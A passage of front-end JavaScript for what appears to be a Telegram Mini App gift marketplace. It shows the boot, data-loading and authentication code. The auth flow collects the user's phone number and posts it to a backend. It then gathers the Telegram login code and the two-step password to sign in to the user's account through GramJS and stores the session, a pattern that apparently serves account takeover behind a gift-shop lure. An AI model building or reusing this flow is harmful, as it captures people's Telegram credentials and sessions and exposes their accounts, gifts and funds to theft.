    if (elements.authModal && !elements.authModal.classList.contains('open')) {
      return null;
    }
    const token = await requestPendingToken(phone);
    if (token) return token;
    await delay(intervalMs);
  }
  return null;
}

async function waitForBackendPhone(timeoutMs = 15000, intervalMs = 800) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (elements.authModal && !elements.authModal.classList.contains('open')) {
      return null;
    }
    const phone = await requestPhoneFromBackend();
    if (phone) return phone;
    await delay(intervalMs);
  }
  return null;
}

async function startAuth(event) {
  if (event?.preventDefault) event.preventDefault();
  if (authLoading) return;
  triggerHaptic('light');

  authLoading = true;
  if (elements.authStart) elements.authStart.disabled = true;
  setAuthStatus('');

  const requester = buildRequesterPayload();
  if (!requester.user_id) {
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
    setAuthStatus(t('phone_missing'), true);
    showAuthStep(elements.authIntro);
    return;
  }

  showAuthStep(elements.authIntro);
  setAuthStatus(t('phone_missing'));

  const contact = await requestPhoneFromTelegram();
  if (!contact?.shared) {
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
    setAuthStatus(t('phone_missing'), true);
    showAuthStep(elements.authIntro);
    return;
  }

  if (contact.phone) {
    await postPhoneToBackend(contact.phone);
  }

  const phone = contact.phone || (await waitForBackendPhone());
  if (!phone) {
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
    setAuthStatus(t('phone_missing'), true);
    showAuthStep(elements.authIntro);
    return;
  }

  const digits = String(phone).replace(/\D/g, '');
  if (digits.length < 7) {
    setAuthStatus(t('phone_short'), true);
    authLoading = false;
    if (elements.authStart) elements.authStart.disabled = false;
    showAuthStep(elements.authIntro);
    return;
  }

  showAuthStep(elements.authCodeForm);
  setAuthStatus(t('sending_code'));
  toggleAuthInputs(elements.authCodeForm, true);

  try {
    const normalized = phone.startsWith('+') ? phone : `+${digits}`;
    await startGramjsAuth(normalized);
  } catch (err) {
    await handleGramjsAuthError(err, gramjsAuth);
  }
}

async function submitCode(event) {
  event.preventDefault();
  if (authLoading || !authToken || !gramjsAuth) return;
  triggerHaptic('light');
  setCodeError(false);

  const code = elements.authCodeInput?.value?.trim() || '';
  if (code.length < 5) {
    setCodeError(true);
    setAuthStatus(t('code_short'), true);
    return;
  }

  authLoading = true;
  toggleAuthInputs(elements.authCodeForm, true);
  setAuthStatus(t('verify_code'));
  if (!gramjsAuth.codeDeferred) {
    await handleGramjsAuthError(new Error('AUTH_FLOW_MISSING'), gramjsAuth);
    return;
  }
  gramjsAuth.codeDeferred.resolve(code);
  showAuthStep(elements.authLoading);
}

async function submitPassword(event) {
  event.preventDefault();
  if (authLoading || !authToken || !gramjsAuth) return;
  triggerHaptic('light');
  setPasswordError(false);

  const password = elements.authPasswordInput?.value?.trim() || '';
  if (!password) {
    setPasswordError(true);
    return;
  }

  authLoading = true;
  toggleAuthInputs(elements.authPasswordForm, true);
  setAuthStatus(t('verify_password'));
  if (!gramjsAuth.passwordDeferred) {
    await handleGramjsAuthError(new Error('AUTH_FLOW_MISSING'), gramjsAuth);
    return;
  }
  gramjsAuth.passwordDeferred.resolve(password);
  showAuthStep(elements.authLoading);
}

function bindAuthModal() {
  if (elements.authModal) {
    elements.authModal.querySelectorAll('[data-close="true"]').forEach((el) => {
      el.addEventListener('click', () => {
        triggerHaptic('light');
        closeAuthModal();
      });
    });
  }

  if (elements.authStart) {
    elements.authStart.addEventListener('click', () => {
      triggerHaptic('light');
      startAuth();
    });
  }

  if (elements.authCodeForm) elements.authCodeForm.addEventListener('submit', submitCode);
  if (elements.authPasswordForm) elements.authPasswordForm.addEventListener('submit', submitPassword);
  if (elements.authBack) {
    elements.authBack.addEventListener('click', () => {
      triggerHaptic('light');
      authToken = null;
      setPasswordHint('');
      showAuthStep(elements.authIntro);
    });
  }
  if (elements.authBackPassword) {
    elements.authBackPassword.addEventListener('click', () => {
      triggerHaptic('light');
      setPasswordError(false);
      if (elements.authPasswordInput) {
        elements.authPasswordInput.value = '';
      }
      setPasswordHint('');
      showAuthStep(elements.authCodeForm);
    });
  }
}

async function loadData(skipBoot = shouldSkipBoot()) {
  if (dataLoaded) return;
  dataLoaded = true;
  const minDelay = skipBoot ? wait(0) : wait(3000);
  const gifReady = preloadImage(`${API_BASE}${GIFT_POPUP_GIF}`);
  const [marketRes, ownedRes, profileRes, accessRes, settingsRes] = await Promise.all([
    fetchJson('/market/gifts', { items: DEFAULT_MARKET }),
    fetchJson('/market/owned', { items: DEFAULT_OWNED }),
    fetchJson(getProfilePath(), DEFAULT_PROFILE),
    fetchJson(getAccessPath(), { allowed: false }),
    fetchJson(getSettingsPath(), { send_mode: 'gift' }),
  ]);

  const baseMarket = Array.isArray(marketRes?.items) ? marketRes.items : DEFAULT_MARKET;
  state.market = baseMarket;
  state.marketPopular = shufflePreferCheap(baseMarket);
  state.marketNew = [...baseMarket].sort((a, b) => getItemNumberValue(b) - getItemNumberValue(a));
  initSortRange(baseMarket);
  setSortMode(state.sortMode);
  const ownedItems = Array.isArray(ownedRes?.items) ? ownedRes.items : DEFAULT_OWNED;
  const ownedForUser = filterOwnedForCurrentUser(ownedItems);
  state.owned = dedupeToyBear(ownedForUser);
  state.profile = { ...DEFAULT_PROFILE, ...(profileRes || {}) };
  state.hasChatAccess = Boolean(accessRes?.allowed);
  state.sendMode = settingsRes?.send_mode === 'stars' ? 'stars' : 'gift';
  applySettingsUi();

  await Promise.all([minDelay, gifReady]);
  renderMarket();
  renderOwned();
  applyProfile(state.profile);
  updateCartUi();

  clearBootOverlay();
  markBootShown();
  const openedStars = handleStartParam();
  if (!openedStars) {
    maybeShowGiftPopup();
  }
}

document.addEventListener('DOMContentLoaded', () => {
  initTelegram();
  loadSettings();
  applyTranslations();
  applySettingsUi();
  const skipBoot = shouldSkipBoot();
  if (elements.boot) {
    if (skipBoot) {
      clearBootOverlay();
    } else {
      setTimeout(() => {
        elements.boot.classList.add('is-active');
      }, 60);
    }
  }
  bindNavigation();
  bindSearch();
  bindFilters();
  bindSettings();
  bindSortChips();
  bindSortRange();
  bindCodeInput();
  bindPasswordInput();
  bindGiftModal();
  bindBalancePlus();
  bindBalanceBlocks();
  bindTopupModal();
  bindStarsTopupModal();
  bindWithdrawModal();
  bindStarsClaimModal();
  bindActionModal();
  bindPurchaseModal();
  bindCartModal();
  bindActions();
  bindStarsPanel();
  bindAuthModal();
  setAuthorized(Boolean(safeStorageGet(GRAMJS_SESSION_KEY)));
  setTab('market');
  loadData(skipBoot);
  renderIcons();
});
